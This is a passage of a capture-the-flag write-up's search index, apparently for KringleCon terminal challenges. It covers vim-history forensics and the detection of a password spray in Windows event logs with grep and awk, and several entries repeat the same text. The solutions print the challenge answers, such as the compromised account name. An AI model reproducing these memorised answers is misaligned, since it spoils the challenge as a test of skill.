https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/","title":"Hints"},{"location":"Terminals/8-forensics.html#solution","text":"In the file .secrets/her/poem.txt, there are two references to NEVERMORE. We also see there's a .viminfo file in the home directory. Viminfo will store the history of commands executed in vi, including as search and substitute commands. This leads us to find that the word Elinore was replaced with NEVERMORE using the vi search and replace command %s/Elinore/NEVERMORE/g . elf@0c65bbb4e3b4:~$ find . . ./.profile ./.bashrc ./.bash_logout ./.bash_history ./.viminfo ./.secrets ./.secrets/her ./.secrets/her/poem.txt ./runtoanswer elf@0c65bbb4e3b4:~$ cat .secrets/her/poem.txt Once upon a sleigh so weary, Morcel scrubbed the grime so dreary, Shining many a beautiful sleighbell bearing cheer and sound so pure-- There he cleaned them, nearly napping, suddenly there came a tapping, As of someone gently rapping, rapping at the sleigh house door. Tis some caroler, he muttered, tapping at my sleigh house door-- Only this and nothing more. Then, continued with more vigor, came the sound he didn t figure, Could belong to one so lovely, walking bout the North Pole grounds. But the truth is, she WAS knocking, cause with him she would be talking, Off with fingers interlocking, strolling out with love newfound? Gazing into eyes so deeply, caring not who sees their rounds. Oh, twould make his heart resound! Hurried, he, to greet the maiden, dropping rag and brush - unlaiden. Floating over, more than walking, moving toward the sound still knocking, Pausing at the elf-length mirror, checked himself to study clearer, Fixing hair and looking nearer, what a hunky elf - not shocking! Peering through the peephole smiling, reaching forward and unlocking: NEVERMORE in tinsel stocking! Greeting her with smile dashing, pearly-white incisors flashing, Telling jokes to keep her laughing, soaring high upon the tidings, Of good fortune fates had borne him. Offered her his dexter forelimb, Never was his future less dim! Should he now consider gliding-- No - they shouldn t but consider taking flight in sleigh and riding Up above the Pole abiding? Smile, she did, when he suggested that their future surely rested, Up in flight above their cohort flying high like ne er before! So he harnessed two young reindeer, bold and fresh and bearing no fear. In they jumped and seated so near, off they flew - broke through the door! Up and up climbed team and humor, Morcel being so adored, By his lovely NEVERMORE! -Morcel Nougat elf@0c65bbb4e3b4:~$ grep NEVERMORE .viminfo $NEVERMORE :%s/Elinore/NEVERMORE/g |2,0,1536607217,, %s/Elinore/NEVERMORE/g","title":"Solution"},{"location":"Terminals/9-loganalysis.html","text":"Yule Log Analysis Location: East Hall Problem I am Pepper Minstix, and I m looking for your help. Bad guys have us tangled up in pepperminty kelp! Password spraying is to blame for this our grinchly fate. Should we blame our password policies which users hate? Here you ll find a web log filled with failure and success. One successful login there requires your redress. Can you help us figure out which user was attacked? Tell us who fell victim, and please handle this with tact... Submit the compromised webmail username to runtoanswer to complete this challenge. elf@4b866d6674a5:~$ Hints Pepper Minstix introduces this terminal: Have you heard of password spraying? It seems we've been victim. We fear that they were successful in accessing one of our Elf Web Access accounts, but we don't know which one. Parsing through .evtx files can be tricky, but there's a Python script that can help you convert it into XML for easier grep'ing. Pepper also provides a link to a webpage on Password Spraying: https://securityweekly.com/2017/07/21/tsw11/ Solution In the home directory, we have a Windows eventlog file and a Python script to convert it to XML format. elf@3b7a816ee05c:~$ ls -l total 6896 -rw-r--r-- 1 elf elf 1353 Dec 14 16:13 evtx_dump.py -rw-r--r-- 1 elf elf 1118208 Dec 14 16:13 ho-ho-no.evtx -rwxr-xr-x 1 elf elf 5936968 Dec 14 16:13 runtoanswer elf@3b7a816ee05c:~$ python evtx_dump.py ho-ho-no.evtx | egrep (EventID|TargetUserName) Events are spread across multiple lines, so we'll have to grep each line that contains either an EventID or a TargetUserName. Eventually you start seeing a series of entries indicative of a password spray attack: EventID Qualifiers= 4625 /EventID Data Name= TargetUserName aaron.smith /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName abhishek.kumar /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName adam.smith /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ahmed.ali /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ahmed.hassan /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ahmed.mohamed /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ajay.kumar /Data Event 4625 is a failed logon, and 4624 is success. Look for the successful logon amongst all of the failures to determine which account was compromised. Eventually you come across an entry showing Minty Candycane logged in successfully during this attack. EventID Qualifiers= 4624 /EventID Data Name= TargetUserName minty.candycane /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName mohamed.ahmed /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName mohamed.ali /Data elf@3b7a816ee05c:~$ runtoanswer Loading, please wait...... Whose account was successfully accessed by the attacker's password spray? minty.candycane MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Silly Minty Candycane, well this is what she gets. Winter2018 isn t for The Internets. Passwords formed with season-year are on the hackers list. Maybe we should look at guidance published by the NIST? Congratulations! Alternative You know, looking through those logs was pretty hard on the eyes. Maybe there is a better way. Let's start by dumping all of the events into a text file so we can get a better look at the log file structure. elf@c78226a6a169:~$ evtx_dump.py ho-ho-no.evtx ho-ho-no.txt The sign of a password spray attack is a series of failed logons for different usernames over a short span of time. Since we know the requets came in over the web, let's find a failed logon event with process name of w3wp.exe. Event xmlns= http://schemas.microsoft.com/win/2004/08/events/event System Provider Name= Microsoft-Windows-Security-Auditing Guid= {54849625-5478-4994-a5ba-3e3b0328c30d} /Provider EventID Qualifiers= 4625 /EventID Version 0 /Version Level 0 /Level Task 12544 /Task Opcode 0 /Opcode Keywords 0x8010000000000000 /Keywords TimeCreated SystemTime= 2018-09-10 12:41:50.900736 /TimeCreated EventRecordID 234488 /EventRecordID Correlation ActivityID= {71a9b66f-4900-0001-a8b6-a9710049d401} RelatedActivityID= /Correlation Execution ProcessID= 664 ThreadID= 712 /Execution Channel Security /Channel Computer WIN-KCON-EXCH16.EM.KRINGLECON.COM /Computer Security UserID= /Security /System EventData Data Name= SubjectUserSid S-1-5-18 /Data Data Name= SubjectUserName WIN-KCON-EXCH16$ /Data Data Name= SubjectDomainName EM.KRINGLECON /Data Data Name= SubjectLogonId 0x00000000000003e7 /Data Data Name= TargetUserSid S-1-0-0 /Data Data Name= TargetUserName sparkle.redberry /Data Data Name= TargetDomainName EM.KRINGLECON /Data Data Name= Status 0xc000006d /Data Data Name= FailureReason %%2313 /Data Data Name= SubStatus 0xc000006a /Data Data Name= LogonType 8 /Data Data Name= LogonProcessName Advapi /Data Data Name= AuthenticationPackageName Negotiate /Data Data Name= WorkstationName WIN-KCON-EXCH16 /Data Data Name= TransmittedServices - /Data Data Name= LmPackageName - /Data Data Name= KeyLength 0 /Data Data Name= ProcessId 0x00000000000019f0 /Data Data Name= ProcessName C:\\Windows\\System32\\inetsrv\\w3wp.exe /Data Data Name= IpAddress 10.158.210.210 /Data Data Name= IpPort 47904 /Data /EventData /Event It's helpful that the IP address of the client is logged, but it would be nice if we could get the entire event onto one line for easier searching. awk can help us with that, but then the log data nearly impossible to read, so we can use cut to get the interesting bits out. This helps us to find the pattern of failed logons we're looking for: elf@c78226a6a169:~$ awk / \\/Event /{if (NR!=1)print ;next}{printf %s| ,$0}END{print ;} ho-ho-no.txt | grep w3wp.exe | grep 4625 | grep 172.31.254.101 | cut -d | -f 22,36 Data Name= TargetUserName test.user /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName aaron.smith /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName abhishek.kumar /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName adam.smith /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ahmed.ali /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ahmed.hassan /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ahmed.mohamed /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ajay.kumar /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName alex.smith /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ali.khan /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ali.raza /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName amanda.smith /Data | Data Name= IpAddress 172.31.254.101 /Data This shows that the source IP address of the password spray attack is 172.31.254.101. It now becomes a simple matter to find any successful log entries (Event ID 4624) associated with IP address 172.31.254.101. elf@c78226a6a169:~$ awk / \\/Event /{if (NR!=1)print ;next}{printf %s| ,$0}END{print ;} ho-ho-no.txt | grep w3wp.exe | grep 4624 | grep 172.31.254.101 | cut -d | -f 22,35 Data Name= TargetUserName minty.candycane /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName minty.candycane /Data | Data Name= IpAddress 172.31.254.101 /Data Credit to http://www.theunixschool.com/2012/05/awk-join-or-merge-lines-on-finding.html for the awk wizardry.","title":"Yule Log Analysis"},{"location":"Terminals/9-loganalysis.html#yule-log-analysis","text":"Location: East Hall","title":"Yule Log Analysis"},{"location":"Terminals/9-loganalysis.html#problem","text":"I am Pepper Minstix, and I m looking for your help. Bad guys have us tangled up in pepperminty kelp! Password spraying is to blame for this our grinchly fate. Should we blame our password policies which users hate? Here you ll find a web log filled with failure and success. One successful login there requires your redress. Can you help us figure out which user was attacked? Tell us who fell victim, and please handle this with tact... Submit the compromised webmail username to runtoanswer to complete this challenge. elf@4b866d6674a5:~$","title":"Problem"},{"location":"Terminals/9-loganalysis.html#hints","text":"Pepper Minstix introduces this terminal: Have you heard of password spraying? It seems we've been victim. We fear that they were successful in accessing one of our Elf Web Access accounts, but we don't know which one. Parsing through .evtx files can be tricky, but there's a Python script that can help you convert it into XML for easier grep'ing. Pepper also provides a link to a webpage on Password Spraying: https://securityweekly.com/2017/07/21/tsw11/","title":"Hints"},{"location":"Terminals/9-loganalysis.html#solution","text":"In the home directory, we have a Windows eventlog file and a Python script to convert it to XML format. elf@3b7a816ee05c:~$ ls -l total 6896 -rw-r--r-- 1 elf elf 1353 Dec 14 16:13 evtx_dump.py -rw-r--r-- 1 elf elf 1118208 Dec 14 16:13 ho-ho-no.evtx -rwxr-xr-x 1 elf elf 5936968 Dec 14 16:13 runtoanswer elf@3b7a816ee05c:~$ python evtx_dump.py ho-ho-no.evtx | egrep (EventID|TargetUserName) Events are spread across multiple lines, so we'll have to grep each line that contains either an EventID or a TargetUserName. Eventually you start seeing a series of entries indicative of a password spray attack: EventID Qualifiers= 4625 /EventID Data Name= TargetUserName aaron.smith /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName abhishek.kumar /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName adam.smith /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ahmed.ali /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ahmed.hassan /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ahmed.mohamed /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName ajay.kumar /Data Event 4625 is a failed logon, and 4624 is success. Look for the successful logon amongst all of the failures to determine which account was compromised. Eventually you come across an entry showing Minty Candycane logged in successfully during this attack. EventID Qualifiers= 4624 /EventID Data Name= TargetUserName minty.candycane /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName mohamed.ahmed /Data EventID Qualifiers= 4625 /EventID Data Name= TargetUserName mohamed.ali /Data elf@3b7a816ee05c:~$ runtoanswer Loading, please wait...... Whose account was successfully accessed by the attacker's password spray? minty.candycane MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM Silly Minty Candycane, well this is what she gets. Winter2018 isn t for The Internets. Passwords formed with season-year are on the hackers list. Maybe we should look at guidance published by the NIST? Congratulations!","title":"Solution"},{"location":"Terminals/9-loganalysis.html#alternative","text":"You know, looking through those logs was pretty hard on the eyes. Maybe there is a better way. Let's start by dumping all of the events into a text file so we can get a better look at the log file structure. elf@c78226a6a169:~$ evtx_dump.py ho-ho-no.evtx ho-ho-no.txt The sign of a password spray attack is a series of failed logons for different usernames over a short span of time. Since we know the requets came in over the web, let's find a failed logon event with process name of w3wp.exe. Event xmlns= http://schemas.microsoft.com/win/2004/08/events/event System Provider Name= Microsoft-Windows-Security-Auditing Guid= {54849625-5478-4994-a5ba-3e3b0328c30d} /Provider EventID Qualifiers= 4625 /EventID Version 0 /Version Level 0 /Level Task 12544 /Task Opcode 0 /Opcode Keywords 0x8010000000000000 /Keywords TimeCreated SystemTime= 2018-09-10 12:41:50.900736 /TimeCreated EventRecordID 234488 /EventRecordID Correlation ActivityID= {71a9b66f-4900-0001-a8b6-a9710049d401} RelatedActivityID= /Correlation Execution ProcessID= 664 ThreadID= 712 /Execution Channel Security /Channel Computer WIN-KCON-EXCH16.EM.KRINGLECON.COM /Computer Security UserID= /Security /System EventData Data Name= SubjectUserSid S-1-5-18 /Data Data Name= SubjectUserName WIN-KCON-EXCH16$ /Data Data Name= SubjectDomainName EM.KRINGLECON /Data Data Name= SubjectLogonId 0x00000000000003e7 /Data Data Name= TargetUserSid S-1-0-0 /Data Data Name= TargetUserName sparkle.redberry /Data Data Name= TargetDomainName EM.KRINGLECON /Data Data Name= Status 0xc000006d /Data Data Name= FailureReason %%2313 /Data Data Name= SubStatus 0xc000006a /Data Data Name= LogonType 8 /Data Data Name= LogonProcessName Advapi /Data Data Name= AuthenticationPackageName Negotiate /Data Data Name= WorkstationName WIN-KCON-EXCH16 /Data Data Name= TransmittedServices - /Data Data Name= LmPackageName - /Data Data Name= KeyLength 0 /Data Data Name= ProcessId 0x00000000000019f0 /Data Data Name= ProcessName C:\\Windows\\System32\\inetsrv\\w3wp.exe /Data Data Name= IpAddress 10.158.210.210 /Data Data Name= IpPort 47904 /Data /EventData /Event It's helpful that the IP address of the client is logged, but it would be nice if we could get the entire event onto one line for easier searching. awk can help us with that, but then the log data nearly impossible to read, so we can use cut to get the interesting bits out. This helps us to find the pattern of failed logons we're looking for: elf@c78226a6a169:~$ awk / \\/Event /{if (NR!=1)print ;next}{printf %s| ,$0}END{print ;} ho-ho-no.txt | grep w3wp.exe | grep 4625 | grep 172.31.254.101 | cut -d | -f 22,36 Data Name= TargetUserName test.user /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName aaron.smith /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName abhishek.kumar /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName adam.smith /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ahmed.ali /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ahmed.hassan /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ahmed.mohamed /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ajay.kumar /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName alex.smith /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ali.khan /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName ali.raza /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName amanda.smith /Data | Data Name= IpAddress 172.31.254.101 /Data This shows that the source IP address of the password spray attack is 172.31.254.101. It now becomes a simple matter to find any successful log entries (Event ID 4624) associated with IP address 172.31.254.101. elf@c78226a6a169:~$ awk / \\/Event /{if (NR!=1)print ;next}{printf %s| ,$0}END{print ;} ho-ho-no.txt | grep w3wp.exe | grep 4624 | grep 172.31.254.101 | cut -d | -f 22,35 Data Name= TargetUserName minty.candycane /Data | Data Name= IpAddress 172.31.254.101 /Data Data Name= TargetUserName minty.candycane /Data | Data Name= IpAddress 172.31.254.101 /Data Credit to http://www.theunixschool.com/2012/05/awk-join-or-merge-lines-on-finding.html for the awk wizardry.","title":"Alternative"}]}